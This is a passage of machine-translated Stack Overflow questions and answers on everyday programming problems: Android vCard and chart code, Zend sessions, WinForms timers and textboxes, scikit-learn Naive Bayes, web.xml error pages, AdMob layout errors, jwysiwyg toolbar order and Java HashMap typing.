                        /*Write some other stuff to the vCard also just trying to give whoever needs this a starting point*/  
                        fw.write("TEL;Primary:" + "(586) 268-3437" + "\r\n");
                        fw.write("TEL;OTHER:" + "(313) 313-4545" + "\r\n");

                        fw.write("ADR;OTHER:" + "12345 AnyLane Dr." + "\r\n");
                        fw.write("ADR;OTHER:" + "54321 AnyPlace Av." + "\r\n");

                        fw.write("EMAIL;OTHER:" + "email@yahoo.com" + "\r\n");
                        fw.write("EMAIL;OTHER:" + "email@wowway.com" + "\r\n");

                        fw.write("END:VCARD\r\n");
                        fw.close();

                        Intent i = new Intent();
                        i.setAction(android.content.Intent.ACTION_VIEW);
                        i.setDataAndType(Uri.fromFile(vcfFile), "text/x-vcard");
                        startActivity(i);
                    }
                    catch (Exception e)
                    {
                        Log.i(TAG, "Exception: " + e);
                    }

public Bitmap getContactImage(String file_name)
{
    Log.i(TAG, "Running getContactImage() with file name: " + file_name);

    Bitmap thumbnail = null;
    //------------------------------------------------------------------------------------------
    try
    {
        File filePath = getBaseContext().getFileStreamPath(file_name);
        FileInputStream fis = new FileInputStream(filePath);
        thumbnail = BitmapFactory.decodeStream(fis);
    }
    catch (Exception e) //Use scaled_bitmap_for_storage instead of the current_contact_image file name
    {
        /*Error getting user-selected image, set boolean to get default image*/
        Log.i(TAG, "Exception while running getContactImage() for file name: " + file_name + " with error message: " + e);
    }
    //------------------------------------------------------------------------------------------

    return thumbnail;
} 
```

# php - 重新加载会话值

> ID：15738635
> 
> 赞同：0
> 
> 时间：2013-04-01T06:22:56.500
> 
> 标签：php, zend-framework

zend 框架如何在提交操作时重新加载会话。

用户可能拥有多个用户级别权限，

我在复选框中有包含用户权限的表单，
我想重新加载当前都登录到网络中的会话值。

示例：am admin，当前 x 和 y 用户登录 web 并进行一些活动，他们的权限是 admin，super admin 用户权限，

我是管理员，我想删除他们的超级管理员权限，如果所做的更改比这些权限更改应该立即更改当前访问网站的用户。

如何在zend中实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T08:39:25.533

如果我理解正确，听起来您想更新与角色（ , 等）关联的特权/权限`admin`，`super-admin`然后将这些更新的权限应用于具有该角色的所有用户，即使是*已经登录的用户*。

这实际上不是 ZF 特有的问题。它更多地与您如何构建会话处理有关，特别是，您是否将用户的角色/权限存储在会话中，是否查询 db/datastore 等。

如果您仅在会话中存储核心用户信息并查询每个请求的角色和权限（可能是选项中性能最低的），那么您的问题就解决了。角色和权限已在数据存储中更新，并将在您查询它们时反映出来。

或者，如果您还在会话中存储角色和权限，则需要遍历所有活动会话，更新受新角色影响的会话中的权限。虽然这在技术上对于基于文件的会话是可行的，但通常使用基于数据库的存储来完成会话。

如其他地方所述，`Zend_Session`并且`Zend_Acl`是提供所有这些功能的组件。但是核心架构的决定必须先于这些组件的实现。

# c# - 删除 WinForms 中按键盘的 BackSpace 按钮上的完整文本

> ID：15738638
> 
> 赞同：1
> 
> 时间：2013-04-01T06:23:07.160
> 
> 标签：c#, winforms

说我有一个带有只读属性的文本框。它具有 [my string] 格式的文本，即用方括号括起来。

我想如果这个文本框被聚焦并且用户按下后退按钮来删除这个文本，我知道这是不可能的，因为文本框处于只读模式。

但是仍然在按下后退按钮时，完整的文本将不是一个字符一个字符地删除。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:48:34.077

这是我的解决方案..

我得到了它的工作我自己

```
void txt_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (e.KeyChar == '\b')
        {
            TextEdit textBox1 = sender as TextEdit;
            if (textBox1 != null)
            {
                textBox1.Text = "";
            }

        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:30:44.623

按 Ctrl + A 然后按返回按钮，它会完成这项工作，

```
TextBox tb = new TextBox();
tb.SelectAll(); 
```

# numpy - 具有 scikit-learn 的多项式朴素贝叶斯，用于连续和分类数据

> ID：15738641
> 
> 赞同：0
> 
> 时间：2013-04-01T06:23:10.000
> 
> 标签：numpy, machine-learning, artificial-intelligence, scipy, scikit-learn

我是 scikit-learn 的新手，我正在尝试创建一个多项式贝叶斯模型来预测电影票房。下面只是一个玩具示例，我不确定它是否在逻辑上正确（欢迎提出建议！）。Y 对应于我试图预测的估计总额（1：< $20mi，2：> $20mi）。我还离散化了电影放映的屏幕数量。

问题是，这是解决问题的好方法吗？或者将数字分配给所有类别会更好吗？此外，在 DictVectorizer 对象中嵌入标签（例如“电影：派的生活”）是否正确？

```
def get_data():

    measurements = [ \
    {'movie': 'Life of Pi', 'screens': "some", 'distributor': "fox"},\
    {'movie': 'The Croods', 'screens': "some", 'distributor': "fox"},\
    {'movie': 'San Fransisco', 'screens': "few", 'distributor': "TriStar"},\
    ]
    vec = DictVectorizer()
    arr = vec.fit_transform(measurements).toarray()

    return arr

def predict(X):

    Y = np.array([1, 1, 2])
    clf = MultinomialNB()
    clf.fit(X, Y)
    print(clf.predict(X[2]))

if __name__ == "__main__":
    vector = get_data()
    predict(vector) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T12:11:46.310

我认为原则上这是正确的。

也许将问题表述为票房销售的回归会更自然。

该`movie`功能无用。DictVectorizer 将每个可能的值编码为不同的特征。由于每部电影都有不同的标题，它们都将具有完全独立的特征，因此无法一概而论。

将屏幕编码为数字也可能更好，而不是作为不同范围的一次性编码。

不用说，你需要比这里更好的特性来获得任何合理的预测。

# java - web.xml 中的错误页面配置不起作用

> ID：15738647
> 
> 赞同：0
> 
> 时间：2013-04-01T06:23:43.447
> 
> 标签：java, web, web.xml

我的 web.xml 中有以下配置：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://java.sun.com/xml/ns/javaee"
    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    id="WebApp_ID" version="3.0">

    <display-name>tycoon-sa</display-name>

    <context-param>
        <param-name>br.com.caelum.vraptor.encoding</param-name>
        <param-value>UTF-8</param-value>
    </context-param>

    <error-page>
        <location>/</location>
    </error-page>

    <filter>
        <filter-name>vraptor</filter-name>
        <filter-class>br.com.caelum.vraptor.VRaptor</filter-class>
    </filter>

    <filter-mapping>
        <filter-name>vraptor</filter-name>
        <url-pattern>/*</url-pattern>
        <dispatcher>FORWARD</dispatcher>
        <dispatcher>REQUEST</dispatcher>
        <dispatcher>ERROR</dispatcher>
    </filter-mapping>
</web-app> 
```

我的目标是在出现异常或错误代码（404、500 等）时将用户重定向到主页。但它不起作用。我试图访问一个无效的 URL，但我没有被重定向。应用程序抛出 NullPointerException。这是堆栈跟踪：

```
SEVERE: Servlet.service() for servlet default threw exception  
java.lang.NullPointerException  
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:321)  
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)  
    at br.com.caelum.vraptor.resource.DefaultResourceNotFoundHandler.couldntFind(DefaultResourceNotFoundHandler.java:41)  
    at br.com.caelum.vraptor.interceptor.ResourceLookupInterceptor.intercept(ResourceLookupInterceptor.java:71)  
    at br.com.caelum.vraptor.core.ToInstantiateInterceptorHandler.execute(ToInstantiateInterceptorHandler.java:54)  
    at br.com.caelum.vraptor.core.DefaultInterceptorStack.next(DefaultInterceptorStack.java:54)  
    at br.com.caelum.vraptor.core.EnhancedRequestExecution.execute(EnhancedRequestExecution.java:44)  
    at br.com.caelum.vraptor.VRaptor$1.insideRequest(VRaptor.java:91)  
    at br.com.caelum.vraptor.ioc.spring.SpringProvider.provideForRequest(SpringProvider.java:58)  
    at br.com.caelum.vraptor.VRaptor.doFilter(VRaptor.java:88)  
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)  
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)  
    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:749)  
    at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:489)  
    at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:412)  
    at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:339)  
    at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:456)  
    at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:327)  
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:193)  
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)  
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)  
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)  
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)  
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)  
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)  
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)  
    at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)  
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)  
    at java.lang.Thread.run(Unknown Source)  

Abr 02, 2013 11:04:32 AM org.apache.catalina.core.StandardHostValve custom  
SEVERE: Exception Processing ErrorPage[errorCode=0, location=/]  
java.lang.NullPointerException  
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:321)  
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)  
    at br.com.caelum.vraptor.resource.DefaultResourceNotFoundHandler.couldntFind(DefaultResourceNotFoundHandler.java:41)  
    at br.com.caelum.vraptor.interceptor.ResourceLookupInterceptor.intercept(ResourceLookupInterceptor.java:71)  
    at br.com.caelum.vraptor.core.ToInstantiateInterceptorHandler.execute(ToInstantiateInterceptorHandler.java:54)  
    at br.com.caelum.vraptor.core.DefaultInterceptorStack.next(DefaultInterceptorStack.java:54)  
    at br.com.caelum.vraptor.core.EnhancedRequestExecution.execute(EnhancedRequestExecution.java:44)  
    at br.com.caelum.vraptor.VRaptor$1.insideRequest(VRaptor.java:91)  
    at br.com.caelum.vraptor.ioc.spring.SpringProvider.provideForRequest(SpringProvider.java:58)  
    at br.com.caelum.vraptor.VRaptor.doFilter(VRaptor.java:88)  
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)  
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)  
    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:749)  
    at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:489)  
    at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:412)  
    at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:339)  
    at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:456)  
    at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:327)  
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:193)  
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)  
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)  
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)  
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)  
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)  
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)  
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)  
    at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)  
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)  
    at java.lang.Thread.run(Unknown Source) 
```

有什么线索吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:49:25.080

这是为所有错误配置默认错误页面的方法

```
<error-page>
<location>/whateverpage.html</location>
</error-page> 
```

请记住，这仅在您使用**Servlet 3.0**时才有效。如果您仍在使用 Servlet 2.5，那么您将必须指定每个错误代码。

```
<error-page>
<error-code>404</error-code>
<location>/notfound.html</location>
</error-page>
<error-page>
<error-code>403</error-code>
<location>/general-error.html</location>
</error-page> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:27:06.947

error-page 不能重定向无效的 url。如果你想这样做，你可以使用 apache 服务器并编写以下内容

```
RewriteEngine on    
Redirect /--xyz-75/ http://www.domain.com.au/ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:34:28.777

在错误页面标记 404 /ErrorPage.jsp 中指定错误代码

# android - 使用 AChartEngine 库的条形图

> ID：15738648
> 
> 赞同：9
> 
> 时间：2013-04-01T06:23:48.090
> 
> 标签：android, graph, bar-chart, achartengine, unix-timestamp

我有一个使用库的条形图`AChartEngine`，如下所示::

```
public class MainActivity extends Activity {

  private String[] mMonth = new String[] {
            "Jan", "Feb" , "Mar", "Apr", "May", "Jun",
            "Jul", "Aug" , "Sep", "Oct", "Nov", "Dec"
        };

  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // Getting reference to the button btn_chart
    Button btnChart = (Button) findViewById(R.id.btn_chart);

    // Defining click event listener for the button btn_chart
    OnClickListener clickListener = new OnClickListener() {

        @Override
        public void onClick(View v) {
            // Draw the Income vs Expense Chart
            openChart();                
        }
    };

    // Setting event click listener for the button btn_chart of the MainActivity layout
    btnChart.setOnClickListener(clickListener);

}

private void openChart(){
    int[] x = { 0,1,2,3,4,5,6,7 };
    int[] income = { 2000,2500,2700,3000,2800,3500,3700,3800};
    int[] expense = {2200, 2700, 2900, 2800, 2600, 3000, 3300, 3400 };

    // Creating an  XYSeries for Income
    //CategorySeries incomeSeries = new CategorySeries("Income");
    XYSeries incomeSeries = new XYSeries("Income");
    // Creating an  XYSeries for Income
    XYSeries expenseSeries = new XYSeries("Expense");
    // Adding data to Income and Expense Series
    for(int i=0;i<x.length;i++){            
        incomeSeries.add(i,income[i]);
        expenseSeries.add(i,expense[i]);
    }

    // Creating a dataset to hold each series
    XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();
    // Adding Income Series to the dataset
    dataset.addSeries(incomeSeries);
    // Adding Expense Series to dataset
    dataset.addSeries(expenseSeries);       

    // Creating XYSeriesRenderer to customize incomeSeries
    XYSeriesRenderer incomeRenderer = new XYSeriesRenderer();
    incomeRenderer.setColor(Color.rgb(130, 130, 230));
    incomeRenderer.setFillPoints(true);
    incomeRenderer.setLineWidth(2);
    incomeRenderer.setDisplayChartValues(true);

    // Creating XYSeriesRenderer to customize expenseSeries
    XYSeriesRenderer expenseRenderer = new XYSeriesRenderer();
    expenseRenderer.setColor(Color.rgb(220, 80, 80));
    expenseRenderer.setFillPoints(true);
    expenseRenderer.setLineWidth(2);
    expenseRenderer.setDisplayChartValues(true);        
    Calendar cal = Calendar.getInstance();
    cal.clear(Calendar.HOUR);
    // Creating a XYMultipleSeriesRenderer to customize the whole chart
    XYMultipleSeriesRenderer multiRenderer = new XYMultipleSeriesRenderer();
    multiRenderer.setXLabels(0);
    multiRenderer.setChartTitle("Income vs Expense Chart");
    multiRenderer.setXTitle("Year 2012");
    multiRenderer.setYTitle("Amount in Dollars");
    multiRenderer.setZoomButtonsVisible(true);              
    for(int i=0; i< x.length;i++){
        multiRenderer.addXTextLabel(i, mMonth[i]);          
    }       

    // Adding incomeRenderer and expenseRenderer to multipleRenderer
    // Note: The order of adding dataseries to dataset and renderers to multipleRenderer
    // should be same
    multiRenderer.addSeriesRenderer(incomeRenderer);
    multiRenderer.addSeriesRenderer(expenseRenderer);

    // Creating an intent to plot bar chart using dataset and multipleRenderer      
    Intent intent = ChartFactory.getBarChartIntent(getBaseContext(), dataset, multiRenderer, Type.DEFAULT);

    // Start Activity
    startActivity(intent);

}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
 }
} 
```

上面的代码图如下所示：

[![图片](https://i.stack.imgur.com/NY4fS.png)](https://i.stack.imgur.com/NY4fS.png)

但我需要绘制具有以下属性的图表：

1.  X轴必须显示当前时间。如下图所示，时间是> 2am
2.  X 轴上的每个柱子是 5 分钟柱子
3.  每 5 分钟我发送一个数据，它应该根据值绘制一个条形图。
4.  现在忽略 Y 轴参数只需要如何绘制所需的 X-aixs

图表看起来像这样：

[![图片](https://i.stack.imgur.com/dB3uZ.png)](https://i.stack.imgur.com/dB3uZ.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T04:40:28.733

我做了这样的事情:: 用于静态数据

```
public class MainActivity extends Activity {
 final Calendar c = Calendar.getInstance();
        int mMinute = c.get(Calendar.MINUTE);
        int mHour = c.get(Calendar.HOUR_OF_DAY);
        int am =c.get(Calendar.AM_PM); 
       int[] x =new int[1920];
        int[] sleep = {4,3,2,1,4,3,2,1,4,3,2,1,4,1,1,1,4,4,2,2,2,3,3,2,2,2,2,2,1,1,1,1,1,1,4,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2};      
  public String getnext(int a)
  {
      String ap;
      if(am==1){ap="PM";}
      else{ap="AM";}
    String s= mHour+" "+ap;
    mMinute=mMinute+5;

    if (mHour >=12){
        mHour=mHour-12;
        switch(am){case 0:am=1; break; case 1:am=0;break;}
    }
        if(mMinute >= 60)
        {
            mHour= mHour+1;
            mMinute=mMinute-60;
        }
        //Log.d("Gr","mMinute: "+mMinute);
        if(mMinute==1 | mMinute==2 | mMinute==3 |mMinute==4 | mMinute==0)
        {s= mHour+" "+ap;}
        else{s="";}

        return (s);}
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
  //  setContentView(R.layout.activity_main);

    openChart();
   }

private void openChart(){
    XYSeries sleepSeries = new XYSeries("Sleep");

    for(int i=0;i<sleep.length;i++){   
        sleepSeries.add(i,sleep[i]);
    }

    // Creating a dataset to hold each series
    XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();
    // Adding Income Series to the dataset
    dataset.addSeries(sleepSeries);     

    // Creating XYSeriesRenderer to customize incomeSeries
    XYSeriesRenderer sleepRenderer = new XYSeriesRenderer();
    sleepRenderer.setColor(Color.GREEN);
    sleepRenderer.setFillPoints(true);

    sleepRenderer.setLineWidth((float) .2);

    // Creating a XYMultipleSeriesRenderer to customize the whole chart
    XYMultipleSeriesRenderer multiRenderer = new XYMultipleSeriesRenderer();
    multiRenderer.setXLabels(0);
    multiRenderer.setYAxisMin(0);
    multiRenderer.setYLabels(0);
    multiRenderer.setYAxisMax(4);
    multiRenderer.setChartTitle("Sleep vs Time"); 
    multiRenderer.setBarSpacing(.5);
    //multiRenderer.setZoomButtonsVisible(true);
    multiRenderer.setLegendHeight((int) 5);
    multiRenderer.setPanEnabled(true, false);

    multiRenderer.addSeriesRenderer(sleepRenderer);

    // Creating an intent to plot bar chart using dataset and multipleRenderer      
    Intent intent = ChartFactory.getBarChartIntent(getBaseContext(), dataset, renderer, Type.DEFAULT);

    // Start Activity
    startActivity(intent);

} 
```

我得到了像

[![df](https://i.stack.imgur.com/BgZJW.png)](https://i.stack.imgur.com/BgZJW.png)

**更新：：：**

对于实时数据，更新系列如

```
 static ArrayList<Integer> sleep = new ArrayList<Integer>(); 
```

当 newval 可用时

```
 sleep.add(newval); 
```

然后调用`openChart();`第一个清除数据集（`dataset.clear();`）然后调用`repaint();`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-04T20:03:50.860

您可以在 X 轴上保留 Unix 时间戳并自己控制标签。您可以使用以下方法添加自定义 X 轴标签：

```
renderer.addXTextLabel(x, "label"); 
```

Unix 时间戳是 Date 对象上的 getTime() 返回的值。因此，您可以将这些值添加到您的系列中：

```
series.add(date.getTime(), value); 
```

然后，您可以为某些值添加自定义标签：

```
SimpleDateFormat format = new SimpleDateFormat("h a");
renderer.addXTextLabel(date.getTime(), format.format(date.getTime())); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-03T04:02:08.350

我认为根据您的要求，创建自定义条形图将变得容易。这是示例，您可以通过简单地使用要在图表上显示的 5 个数组来使用此示例进行开发。

[`Bar Chart in Android With out any Built in jars`](http://rakhi577.wordpress.com/2012/10/11/bar-chart-in-android-with-out-any-built-in-jars/)

只是，仔细阅读示例并检查它。

主要优点是您不需要使用任何预定义的库来绘制图表。可以使用简单的android UI，例如`TextView and ListView`

# android - 每次我运行它时应用程序都会崩溃

> ID：15738653
> 
> 赞同：-5
> 
> 时间：2013-04-01T06:24:42.607
> 
> 标签：android, admob

activity_main.xml

```
<RelativeLayout
     xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
     android:layout_width="fill_parent"
     android:layout_height="fill_parent">   

     <TextView 
         android:layout_height="wrap_content" 
         android:layout_width="fill_parent" 
         android:text="@string/hello_world"/>

     <com.admob.android.ads.AdView
         android:id="@+id/ad"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         ads:adSize="BANNER"
         ads:adUnitId="***************"
         ads:loadAdOnCreate="true"
         ads:testDevices="TEST_EMULATOR" /> </RelativeLayout> 
```

SimpleBaner 广告清单

```
<?xml version="1.0"
 encoding="utf-8"?> <manifest
 xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.simplebanerad"
     android:versionCode="1"
     android:versionName="1.0" >

     <uses-sdk
         android:minSdkVersion="13"
         android:targetSdkVersion="17" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>

     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
         android:label="@string/app_name"
         android:theme="@style/AppTheme" >
         <activity
             android:name="com.example.simplebanerad.MainActivity"
             android:label="@string/app_name" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />

                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
         <activity 
             android:name="com.google.ads.AdActivity"                 android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize">
         </activity>
     </application>

 </manifest> 
```

MainActivity.java 包 com.example.simplebanerad；

```
 import android.os.Bundle; import android.app.Activity; import
 android.view.Menu;

 public class MainActivity extends Activity { @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
     }

     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
         // Inflate the menu; this adds items to the action bar if it is present.
         getMenuInflater().inflate(R.menu.main, menu);
         return true;
     } } 
```

我想展示广告，但每次运行我的应用程序都会崩溃。我在 4.2.2 API 级别 17 模拟器上运行它。我哪里错了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:04:49.270

> 膨胀类 com.admob.android.ads.AdView 时出错

您收到此错误，因为 AdView 类不在`com.admob.android.ads`包中，它在`com.google.ads`包中。

所以改变这个：

```
<com.admob.android.ads.AdView
         android:id="@+id/ad"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         ads:adSize="BANNER"
         ads:adUnitId="***************"
         ads:loadAdOnCreate="true"
         ads:testDevices="TEST_EMULATOR" /> 
```

对此：

```
<com.google.ads.AdView
         android:id="@+id/ad"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         ads:adSize="BANNER"
         ads:adUnitId="***************"
         ads:loadAdOnCreate="true"
         ads:testDevices="TEST_EMULATOR" /> 
```

# c# - 在某个随机时间间隔后调用方法

> ID：15738656
> 
> 赞同：0
> 
> 时间：2013-04-01T06:24:55.817
> 
> 标签：c#, winforms

我有 5 种方法，我需要在随机间隔（1 到 3 秒）的时间后调用它们。说第一个方法在 1 秒后调用，然后在 2.3 秒后调用第二个方法，在 1.5 后调用下一个方法等。我使用计时器进行了以下操作

```
System.Windows.Forms.Timer mytimer = new System.Windows.Forms.Timer();
mytimer.Tick += new EventHandler(TimerEventProcessor);    
Random rand = new Random();
int fortimerinterval = rand.Next(1000, 3000);
mytimer.Interval = fortimerinterval; 
mytimer.Enabled = true;
mytimer.Start();

    public void TimerEventProcessor(Object myObject, EventArgs myEventArgs)
    {
        fortimerinterval = rand.Next(1000, 3000);
        mytimer.Interval = fortimerinterval; 
        first time call function1, then call function2
        //this is main theme, so im not giving whole code here

    } 
```

但定时器间隔在获得第一个随机值后保持不变。似乎每次调用 TimerEventProcessor 时，timerinterval 的值都不会改变。我怎样才能做到这一点？或者，如果有任何其他简单的方法可以做到这一点。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:39:13.717

我对您的代码进行了一些修改并进行了尝试。它工作正常。

```
Random rand = new Random();
Timer mytimer = new Timer();

private void fireTimerClick(object sender, EventArgs e)
{
    mytimer.Tick += new EventHandler(TimerEventProcessor);
    mytimer.Interval = rand.Next(1000, 3000);
    mytimer.Enabled = true;
    mytimer.Start();
}

public void TimerEventProcessor(Object myObject, EventArgs myEventArgs)
{
    mytimer.Interval = rand.Next(1000, 3000);

    System.Diagnostics.Debug.WriteLine(DateTime.Now);
} 
```

您可以使用调试输出窗口验证这一点。`fireTimerClick`只是一个按钮单击事件处理程序。

# jquery - 如何重新排序所见即所得编辑器的控件

> ID：15738658
> 
> 赞同：0
> 
> 时间：2013-04-01T06:24:57.613
> 
> 标签：jquery, css, ruby-on-rails, wysiwyg

我正在使用显示的[https://github.com/akzhan/jwysiwyg](https://github.com/akzhan/jwysiwyg)

```
B I U 
```

作为控件，我想更改控件的顺序，所以**粗体**不会首先显示为选项。

我查看了源代码并在[https://github.com/akzhan/jwysiwyg/blob/master/jquery.wysiwyg.css](https://github.com/akzhan/jwysiwyg/blob/master/jquery.wysiwyg.css)中看到

```
div.wysiwyg ul.toolbar li.bold { background-position: -1px -15px; }
div.wysiwyg ul.toolbar li.italic { background-position: -18px -15px; } 
```

所以我把它改成

```
div.wysiwyg ul.toolbar li.bold { background-position: -18px -15px; }
div.wysiwyg ul.toolbar li.italic { background-position: -1px -15px; } 
```

现在在编辑器中，我在 B 之前，但是当我点击时，我仍然是粗体，当我点击 B 时，它仍然是斜体。如何解决这个问题？还有无论如何不编辑主 jquery.wysiwyg.css 文件而只是覆盖 .css 和 .js 代码？我正在使用 RubyonRails 顺便说一句

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:27:36.667

您需要在**所见即所得.js的源代码中更改粗体和斜体属性的顺序**

我只是改变了以下代码的位置

```
bold: {
            groupIndex: 0,
            visible: true,
            tags: ["b", "strong"],
            css: {
                fontWeight: "bold"
            },
            tooltip: "Bold",
            hotkey: {"ctrl": 1, "key": 66}
        }, 
```

和

```
italic: {
            groupIndex: 0,
            visible: true,
            tags: ["i", "em"],
            css: {
                fontStyle: "italic"
            },
            tooltip: "Italic",
            hotkey: {"ctrl": 1, "key": 73}
        }, 
```

但是，我没有更改任何 CSS，但它仍然可以正常工作。默认情况下，**粗体：**属性是**wysiwyg.js文件中****this.controls**对象中传递的第一个属性，不知道为什么即使不修改 css 文件它仍然有效。

 ****编辑：**

**演示**：http: [//jsfiddle.net/M2uKK/2/](http://jsfiddle.net/M2uKK/2/)

我添加了小提琴本身所需的所有 js 和 css 文件的源代码，因为我无法为它们找到 cdns。图像将不可用，但您仍然可以看到第一个和第二个选项是斜体和粗体。

**注意：**我在这里所做的唯一更改是更改粗体和斜体属性的位置，如前所述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:28:00.760

您正在编辑的是项目的精灵。页面中有一个包含所有需要的图像的背景，将一个放在另一个的一侧，然后在每个元素中调整这个大图像的位置以仅显示元素所需的部分。

因此，您只更改显示的图像。

如果不看更多代码，很难说你怎么能实现你想要的。可能是一些相对定位？**

# java - 在 Arraylist 中添加值 > 在 hashmap android 中

> ID：15738659
> 
> 赞同：2
> 
> 时间：2013-04-01T06:24:58.727
> 
> 标签：java, android, xml-parsing, arraylist, hashmap

我必须获取数据列表。

所以我使用了字符串的arraylist和list.here我如何在地图上添加值。

我使用了以下代码：

```
 static final String KEY_TITLE = "Category";
         static final String KEY_ARTICLE = "article";
          static final String KEY_IMAGE = "image";

 final ArrayList<HashMap<String,  List<String>>> songsList = new ArrayList<HashMap<String,  List<String>>>();
        XMLParser parser = new XMLParser();
        String xml = parser.getXmlFromUrl(URL); // getting XML from URL
        Document doc = parser.getDomElement(xml); // getting DOM element

        NodeList nl = doc.getElementsByTagName(KEY_TITLE);
        NodeList nl1 = doc.getElementsByTagName(KEY_ARTICLE);
        NodeList nl2 = doc.getElementsByTagName(KEY_IMAGE);
        System.out.println(nl.getLength());
        for (int i = 0; i < nl.getLength(); i++) {
           //System.out.println(nl.getLength());
            HashMap<String, List<String>> map = new HashMap<String, List<String>>();
            map.put( KEY_TITLE,((Element)nl.item(i)).getAttribute("name"));
           for (int j = 0; j < nl1.getLength(); j++) {
              map.put( KEY_ARTICLE,((Element)nl1.item(j)).getAttribute("title"));
              map.put( KEY_IMAGE,((Element)nl2.item(j)).getAttribute("url"));
             }
           songsList.add(map);
          } 
```

`(map.put( KEY_TITLE,((Element)nl.item(i)).getAttribute("name"));)`在这些行上出现以下错误：

```
The method put(String, List<String>) in the type HashMap<String,List<String>> is not applicable for the arguments (String, String) 
```

我怎样才能清除这些错误..请为我提供解决方案...

* * *

